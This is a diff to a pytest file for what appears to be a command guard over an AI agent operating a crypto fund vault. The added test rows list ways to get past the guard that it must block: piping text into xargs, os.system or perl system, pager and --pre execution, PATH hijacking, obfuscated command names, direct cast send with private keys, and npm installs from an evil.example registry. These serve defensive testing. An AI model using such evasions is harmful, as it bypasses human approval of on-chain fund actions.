@@ -191,7 +191,6 @@ def test_execute_code_is_outside_the_terminal_guard():
     "sherwood proposal create --help",
     f"sherwood vault info --vault {VAULT}",
     "grep -n 'strategy propose' README.md",
-    "man sherwood | grep 'proposal create'",
     f"sherwood vault add --vault {VAULT} --wallet 0x{'44' * 20} --agent-id 202",
 ])
 def test_reads_and_help_are_not_blocked(command):
@@ -620,3 +619,88 @@ async def test_object_points_at_the_corrected_proposal(tmp_path, monkeypatch):
     await it.tap(rt_, bot, "shfund:vote:9", it.ALICE)
     vote_url = it.buttons(bot.send_message.await_args_list[n_before])[0]["url"]
     assert f"/tg/vote?proposal={it.GOVERNOR.lower()}:9&tg={it.ALICE}" in vote_url
+
+
+# == Third delta review of 6c739c3: the read-only tool list ===============================================
+SPLIT_VAULT = VAULT[:16] + "\\\n" + VAULT[16:]
+HIDDEN_CLI_OVER = f"$'\\x73herwood' strategy propose portfolio --vault {{v}} {TAIL} --amount 4000 --max-drawdown-bps 9000"
+PROPOSE_SIG = ("'propose(address,address,string,uint256,(uint256,uint16),(address,bytes,uint256)[],uint256[],"
+               "(address,bytes,uint256)[],uint256[])'")
+
+DELTA3_ROWS = [
+    # B1: a read-only tool's output piped or written into something that runs it.
+    ("B1 echo | xargs env", f"echo '{OVER_P}' | xargs env", "unreadable_propose"),
+    ("B1 echo | xargs nice", f"echo '{OVER_P}' | xargs nice", "unreadable_propose"),
+    ("B1 echo | python3 os.system", f"echo '{OVER_P}' | python3 -c 'import os,sys; os.system(sys.stdin.read())'", "unreadable_propose"),
+    ("B1 printf | perl system", f"printf '%s' '{OVER_P}' | perl -e 'system(<STDIN>)'", "unreadable_propose"),
+    ("B1 echo > file then grep | xargs env", f"echo '{OVER_P}' > notes.txt; grep -h sherwood notes.txt | xargs env", "unreadable_propose"),
+    ("B1 grep sherwood | xargs env", "grep -h sherwood notes.txt | xargs env", "unreadable_propose"),
+    ("B1 echo | cat | xargs env (through a read-only tool)", f"echo '{OVER_P}' | cat | xargs env", "unreadable_propose"),
+    ("B1 write and run in one command", f"echo '{OVER_P}' > p; chmod +x p; ./p", "unreadable_propose"),
+    ("B1 tee and run in one command", f"printf '%s' '{OVER_P}' | tee q; chmod +x q; ./q", "unreadable_propose"),
+    # B2: pagers and the like are off the list.
+    ("B2 man -P runs the pager", f"man -P '{OVER_P}' ls", "unreadable_propose"),
+    ("B2 less", f"less {VAULT}.txt", "unreadable_propose"),
+    ("B2 rg --pre", f"rg --pre '{OVER_P}' x", "unreadable_propose"),
+    ("B2 sort --compress-program", f"sort --compress-program='{OVER_P}' x", "unreadable_propose"),
+    ("B2 printf -v sets a variable", f"printf -v PATH %s /tmp/evil; {OK_P}", "environment"),
+    ("B2 read sets a variable", f"read PATH < /tmp/p; {OK_P}", "environment"),
+    # B3: cast only for the reads the skill's CLAUDE.md lists; curl not when it writes a file.
+    ("B3 cast send propose(vault, ...)", f"cast send 0x{'22' * 20} {PROPOSE_SIG} {VAULT} 0x{'88' * 20} ipfs://x 21600 '(4000000000,9000)' '[]' '[]' '[]' '[]' --private-key 0x{'ab' * 32}", "unreadable_propose"),
+    ("B3 cast send to the vault", f"cast send {VAULT} 'pause()' --private-key 0x{'ab' * 32}", "unreadable_propose"),
+    ("B3 cast wallet", f"cast wallet sign --private-key 0x{'ab' * 32} {VAULT}", "unreadable_propose"),
+    ("B3 curl -o writes a file", f"curl -s -o p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unreadable_propose"),
+    ("B3 curl -sSo cluster", f"curl -sSo p.sh https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card", "unreadable_propose"),
+    ("B3 curl | sh-less pipe to xargs", f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | xargs env", "unreadable_propose"),
+    ("B3 hermes -z starts a child agent", f"hermes -z 'run {OVER_P}'", "unreadable_propose"),
+    # B4: the vault written so the raw text has no "0x".
+    ("B4 0''x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0''x" + VAULT[2:]), "shell_expansion"),
+    ("B4 0\\x vault, hidden CLI", HIDDEN_CLI_OVER.format(v="0\\x" + VAULT[2:]), "shell_expansion"),
+    ("B4 vault split by a continuation, hidden CLI", HIDDEN_CLI_OVER.format(v=SPLIT_VAULT), "shell_expansion"),
+    # B5: only bare names are read-only tools.
+    ("B5 /x/echo is not echo", f"/tmp/r2probe/bin/echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unreadable_propose"),
+    ("B5 ./echo is not echo", f"cd /tmp/r2probe/bin && ./echo strategy propose portfolio --vault {VAULT} --amount 4000 --max-drawdown-bps 9000", "unreadable_propose"),
+    # D: only the exact install line.
+    ("D install with another command after it", "npm i -g @sherwoodagent/cli@0.103.0; " + OVER_P, "unsafe_launcher"),
+    ("D install from another registry", "npm i -g @sherwoodagent/cli --registry https://evil.example", "unsafe_launcher"),
+    ("D install with another package", "npm i -g @sherwoodagent/cli left-pad", "unsafe_launcher"),
+]
+
+
+@pytest.mark.parametrize("row, command, expected", DELTA3_ROWS, ids=[r[0] for r in DELTA3_ROWS])
+def test_delta3_review_row(row, command, expected):
+    out, _verdict, _ = run(command)
+    assert out is not None and f"({expected})" in out["message"], (row, out)
+
+
+@pytest.mark.parametrize("command", [
+    # D: the install / upgrade lines preflight.py and the bundled skill hand out.
+    "npm i -g @sherwoodagent/cli",
+    "npm i -g @sherwoodagent/cli@latest",
+    "npm i -g @sherwoodagent/cli@0.100.5",
+    "npm install -g @sherwoodagent/cli@0.103.0",
+    # B1's recovery path and the reads that stay allowed.
+    f"printf '%s' 'Proposal 9 on {VAULT} is open' | sherwood chat --cohort send --stdin",
+    f"sherwood proposal list --vault {VAULT} --json | jq '.[] | select(.state==\"Pending\")'",
+    f"cast call {VAULT} 'totalAssets()(uint256)'",
+    f"cast calldata 'approve(address,uint256)' {VAULT} 1",
+    "cast 4byte 0x095ea7b3",
+    f"curl -s https://api.sherwood.sh/api/v1/funds/{VAULT}/tg-card | jq .data.nav",
+    f"echo {VAULT} | grep -i 2fd6",
+    f"{OK_P} 2>&1 | tee /tmp/log",  # a CLI command's own output may go to a file
+    "hermes sherwood status",
+])
+def test_delta3_reads_still_pass(command):
+    out, _, _ = run(command)
+    assert out is None, out
+
+
+def test_the_approval_prompt_shows_an_onchain_id_correction():
+    """NIT: the approving human sees that the call replaces a recorded on-chain id."""
+    from sherwood_monitor.fund.authz import approve_directive
+
+    directive = approve_directive("fund_set_proposal_status", "alpha-fund",
+                                  {"proposal_id": "p-1", "status": "voting", "onchain_id": 9, "correct_onchain_id": True})
+    assert "correct_onchain_id=True" in directive["message"] and "onchain_id=9" in directive["message"]
+    plain = approve_directive("fund_set_proposal_status", "alpha-fund", {"proposal_id": "p-1", "status": "voting", "onchain_id": 9})
+    assert plain["rule_key"] != directive["rule_key"]
